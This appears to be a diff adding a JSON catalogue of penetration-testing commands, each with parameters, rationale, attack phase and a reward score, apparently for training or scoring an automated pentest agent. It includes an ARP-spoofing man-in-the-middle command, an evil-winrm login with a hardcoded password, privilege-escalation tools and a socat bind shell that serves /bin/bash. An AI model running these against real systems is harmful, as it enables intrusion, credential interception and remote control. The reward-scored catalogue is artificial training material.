@@ -1,0 +1,156 @@
+{
+    "actions": [
+      {
+        "command": "recon-ng",
+        "full_command": "recon-ng -m recon/domains-hosts/google_site_web -o SOURCE=example.com -x",
+        "description": "Web reconnaissance framework with modular plugins for OSINT gathering.",
+        "tools": ["recon-ng"],
+        "parameters": ["-m", "-o", "-x"],
+        "param_descriptions": [
+          "Load specified module.",
+          "Output option: specify the domain to search.",
+          "Execute the module."
+        ],
+        "why": "To automate the collection of open-source intelligence related to target domains.",
+        "when": "Initial reconnaissance phase to gather subdomains and hosts.",
+        "phase": "Recon",
+        "reward": 110
+      },
+      {
+        "command": "dnstwist",
+        "full_command": "dnstwist -r -t 50 example.com",
+        "description": "Domain name permutation engine for detecting typo-squatting, phishing, and fraud.",
+        "tools": ["dnstwist"],
+        "parameters": ["-r", "-t 50"],
+        "param_descriptions": [
+          "Enable fuzzy-matching algorithm.",
+          "Threads to speed up DNS resolution."
+        ],
+        "why": "Detect possible phishing and typo-squatting domains to secure brand presence.",
+        "when": "During reconnaissance and domain monitoring phases.",
+        "phase": "Recon",
+        "reward": 90
+      },
+      {
+        "command": "enum4linux",
+        "full_command": "enum4linux -a 10.10.10.10",
+        "description": "Enumerate information from Windows machines via SMB protocol.",
+        "tools": ["enum4linux"],
+        "parameters": ["-a"],
+        "param_descriptions": [
+          "Run all enumeration checks available."
+        ],
+        "why": "Identify shares, users, and policies on Windows hosts for potential attack vectors.",
+        "when": "Post-recon when an SMB port is found open.",
+        "phase": "Recon",
+        "reward": 100
+      },
+      {
+        "command": "nikto",
+        "full_command": "nikto -h http://10.10.10.10 -Tuning 9",
+        "description": "Web server scanner for vulnerabilities and misconfigurations.",
+        "tools": ["nikto"],
+        "parameters": ["-h", "-Tuning 9"],
+        "param_descriptions": [
+          "Specify the target host.",
+          "Run all available tests."
+        ],
+        "why": "Discover known vulnerabilities and outdated software on web servers.",
+        "when": "During vulnerability assessment after detecting an HTTP service.",
+        "phase": "Recon",
+        "reward": 85
+      },
+      {
+        "command": "bettercap",
+        "full_command": "bettercap -iface eth0 -eval 'set arp.spoof.targets 192.168.1.10; arp.spoof on'",
+        "description": "Network attack and monitoring tool capable of man-in-the-middle attacks.",
+        "tools": ["bettercap"],
+        "parameters": ["-iface", "-eval"],
+        "param_descriptions": [
+          "Specify network interface.",
+          "Execute bettercap commands at launch."
+        ],
+        "why": "Perform MITM to intercept credentials or inject malicious payloads.",
+        "when": "During internal network assessments where physical or wireless access is present.",
+        "phase": "Exploitation",
+        "reward": 125
+      },
+      {
+        "command": "exploit-db",
+        "full_command": "searchsploit apache 2.4.49",
+        "description": "Search for public exploits and corresponding vulnerable software.",
+        "tools": ["exploit-db", "searchsploit"],
+        "parameters": ["apache 2.4.49"],
+        "param_descriptions": [
+          "Keyword to search for vulnerabilities in apache 2.4.49."
+        ],
+        "why": "Find ready-made exploits for known vulnerabilities.",
+        "when": "Post-service enumeration when specific versions of software are identified.",
+        "phase": "Exploitation",
+        "reward": 80
+      },
+      {
+        "command": "evil-winrm",
+        "full_command": "evil-winrm -i 10.10.10.10 -u Administrator -p Password123!",
+        "description": "Remote management tool for Windows, often used post-compromise for shell access.",
+        "tools": ["evil-winrm"],
+        "parameters": ["-i", "-u", "-p"],
+        "param_descriptions": [
+          "Target IP address.",
+          "Username.",
+          "Password."
+        ],
+        "why": "Obtain interactive shell on compromised Windows machines.",
+        "when": "After acquiring valid credentials during credential harvesting.",
+        "phase": "Post-Exploitation",
+        "reward": 140
+      },
+      {
+        "command": "winpeas",
+        "full_command": "winpeas.exe",
+        "description": "Windows Privilege Escalation tool for local analysis.",
+        "tools": ["winpeas"],
+        "parameters": [],
+        "param_descriptions": [],
+        "why": "Identify privilege escalation vectors on Windows machines.",
+        "when": "After initial compromise of a Windows host.",
+        "phase": "Privilege Escalation",
+        "reward": 130
+      },
+      {
+        "command": "pspy",
+        "full_command": "pspy64s",
+        "description": "Process monitoring tool for Unix systems to discover cron jobs and scripts.",
+        "tools": ["pspy"],
+        "parameters": [],
+        "param_descriptions": [],
+        "why": "Discover unprivileged user opportunities for escalation through scripts.",
+        "when": "After gaining low-privilege shell on Unix systems.",
+        "phase": "Privilege Escalation",
+        "reward": 120
+      },
+      {
+        "command": "socat",
+        "full_command": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
+        "description": "General purpose bidirectional data transfer tool between two independent data channels.",
+        "tools": ["socat"],
+        "parameters": [
+          "TCP-LISTEN:4444",
+          "reuseaddr",
+          "fork",
+          "EXEC:/bin/bash"
+        ],
+        "param_descriptions": [
+          "Listen on TCP port 4444.",
+          "Allow socket address reuse.",
+          "Allow multiple clients.",
+          "Execute bash shell upon connection."
+        ],
+        "why": "Set up reverse shells or pivoting tunnels during post-exploitation.",
+        "when": "After gaining code execution on a compromised machine.",
+        "phase": "Post-Exploitation",
+        "reward": 125
+      }
+    ]
+  }
+  
